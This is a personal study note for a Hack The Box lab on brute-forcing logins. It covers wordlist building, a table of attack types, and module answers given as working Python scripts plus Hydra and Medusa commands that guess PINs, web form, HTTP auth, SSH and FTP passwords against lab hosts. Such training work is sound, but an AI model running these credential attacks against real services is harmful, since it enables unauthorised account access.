### Content
* Tools:
	* [[Hydra]]
	* [[Medusa]]
* [[#Custom Wordlists]]
	* Create personalized **username** wordlists using [Username Anarchy](https://github.com/urbanadventurer/username-anarchy.git)
	* Create personalized **password** wordlists using [CUPP](https://github.com/Mebus/cupp)
* [[#Edit a wordlist to be tailored to a specific policy with grep]]
* [[#Types of Brute Forcing]]
* [[#HTB Module Answers]]
---
## Edit a wordlist to be tailored to a specific policy with grep
Suppose we have this policy:
- Minimum length: 8 characters 
- Must include:
    - At least one uppercase letter 
    - At least one lowercase letter 
    - At least one number
    - At least two special characters (from the set `!@#$%^&*`)
``` bash
 grep -E '^.{8,}$' old-wordlist.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > new-wordlist.txt
```
---
## Custom Wordlists
* **Username Anarchy** 
``` bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy john doe > john_doe_usernames.txt
```
* **CUPP**
``` bash
cupp -i
```
---
## Types of Brute Forcing
| Method                    | Description                                                                                                                   | Example                                                                                                                                                  | Best Used When...                                                                                                                           |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `Simple Brute Force`      | Systematically tries all possible combinations of characters within a defined character set and length range.                 | Trying all combinations of lowercase letters from 'a' to 'z' for passwords of length 4 to 6.                                                             | No prior information about the password is available, and computational resources are abundant.                                             |
| `Dictionary Attack`       | Uses a pre-compiled list of common words, phrases, and passwords.                                                             | Trying passwords from a list like 'rockyou.txt' against a login form.                                                                                    | The target will likely use a weak or easily guessable password based on common patterns.                                                    |
| `Hybrid Attack`           | Combines elements of simple brute force and dictionary attacks, often appending or prepending characters to dictionary words. | Adding numbers or special characters to the end of words from a dictionary list.                                                                         | The target might use a slightly modified version of a common password.                                                                      |
| `Credential Stuffing`     | Leverages leaked credentials from one service to attempt access to other services, assuming users reuse passwords.            | Using a list of usernames and passwords leaked from a data breach to try logging into various online accounts.                                           | A large set of leaked credentials is available, and the target is suspected of reusing passwords across multiple services.                  |
| `Password Spraying`       | Attempts a small set of commonly used passwords against a large number of usernames.                                          | Trying passwords like 'password123' or 'qwerty' against all usernames in an organization.                                                                | Account lockout policies are in place, and the attacker aims to avoid detection by spreading attempts across multiple accounts.             |
| `Rainbow Table Attack`    | Uses pre-computed tables of password hashes to reverse hashes and recover plaintext passwords quickly.                        | Pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches. | A large number of password hashes need to be cracked, and storage space for the rainbow tables is available.                                |
| `Reverse Brute Force`     | Targets a single password against multiple usernames, often used in conjunction with credential stuffing attacks.             | Using a leaked password from one service to try logging into multiple accounts with different usernames.                                                 | A strong suspicion exists that a particular password is being reused across multiple accounts.                                              |
| `Distributed Brute Force` | Distributes the brute forcing workload across multiple computers or devices to accelerate the process.                        | Using a cluster of computers to perform a brute-force attack significantly increases the number of combinations that can be tried per second.            | The target password or key is highly complex, and a single machine lacks the computational power to crack it within a reasonable timeframe. |

---
## HTB Module Answers
* Q1
``` python
import requests
ip = "94.237.51.112"
port = "40414"
for pin in range(10000):
    p = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={p}")
    print(f"pin: {p}")
    if response.ok:
        print(f"Correct pin: {p}")
        print(response.json())
        break
```
* Q2
``` python
import requests
ip = "94.237.60.32"
port = "45071"
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.split()
for password in passwords:
    print(f"Try: {password}")
    request = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if request.ok:
        print(f"The correct password: {password}")
        print(request.json())
        break
```
* Q3
``` bash
hydra http-get://94.237.53.3:58756/ -l basic-auth-user -P "2023-200_most_used_passwords.txt"
```
* Q4
``` bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f http-post-form://94.237.60.32:33898/:username=^USER^&password=^PASS^:F=Invalid credentials
```
* Q5
``` bash
medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
# Login and use a session from the target:
ssh sshuser@<IP> -p PORT
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```